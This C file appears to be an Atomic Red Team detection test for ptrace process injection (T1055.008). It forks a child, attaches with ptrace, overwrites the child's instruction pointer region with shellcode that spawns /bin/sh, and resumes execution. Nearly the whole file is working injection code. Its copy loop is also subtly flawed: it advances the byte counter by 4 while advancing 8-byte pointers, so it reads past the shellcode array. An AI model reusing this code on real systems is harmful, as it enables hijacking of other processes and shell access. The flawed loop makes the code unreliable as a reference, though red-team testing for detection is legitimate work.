/*
 * Atomic Red Team test for T1055.008 (ptrace System Call)
 *
 * This program spawns a new child process and injects shellcode into said process via ptrace(2).
 *
 * Based on https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
 */

#include <sys/user.h>
#include <signal.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>

/* Spawn /bin/sh */
const char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96"
                        "\x91\xd0\x8c\x97\xff\x48\xf7"
                        "\xdb\x53\x54\x5f\x99\x52\x57"
                        "\x54\x5e\xb0\x3b\x0f\x05";

static int victim_func() {
  printf("* victim process started.\n");
  while (1) {
    sleep(2);
  }
}

int main() {
  /* Spawn a target process. */
  pid_t target_pid = fork();
  if (target_pid < 0) {
    perror("fork");
    return 1;
  }

  if (target_pid == 0) {
    victim_func();
  } else {
    /* Attach to victim process via ptrace. */
    printf("In parent (pid %d), child pid=%d\n", getpid(), target_pid);

    struct user_regs_struct regs;
    if (0 > ptrace(PTRACE_ATTACH, target_pid, NULL, &regs)) {
      perror("ptrace (ATTACH))");
      return 1;
    }
    printf("* Attached to pid %d with ptrace. Waiting.\n", target_pid);

    wait(NULL);

    printf("* Getting child registers.\n");
    if (0 > ptrace(PTRACE_GETREGS, target_pid, NULL, &regs)) {
      perror("ptrace (GETREGS)");
      return 1;
    }

    printf("* Read child rip=%p. Injecting shellcode.\n", (void *)regs.rip);

    long *src_addr = (long *)shellcode;
    long *dest_addr = (long *)regs.rip;

    int i;
    for (i = 0; i < sizeof(shellcode); i += 4) {
      if (0 > ptrace(PTRACE_POKETEXT, target_pid, dest_addr, *src_addr))
      {
        perror("ptrace (POKETEXT)");
        return 1;
      }
      printf("  * Injected '%#08x' into pid %d addr %p.\n", *src_addr, target_pid, dest_addr);
      src_addr++;
      dest_addr++;
    }

    regs.rip += 2;
    printf("Setting child rip to %p\n", (void *)regs.rip);

    if ((ptrace(PTRACE_SETREGS, target_pid, NULL, &regs)) < 0) {
      perror("ptrace (SETREGS)\n");
      return 1;
    }

    printf("* Run injected code.\n");
    if ((ptrace(PTRACE_DETACH, target_pid, NULL, NULL)) < 0) {
      perror("ptrace (DETACH)\n");
      return 1;
    }
 
    wait(NULL);
  }

  return 0;
}
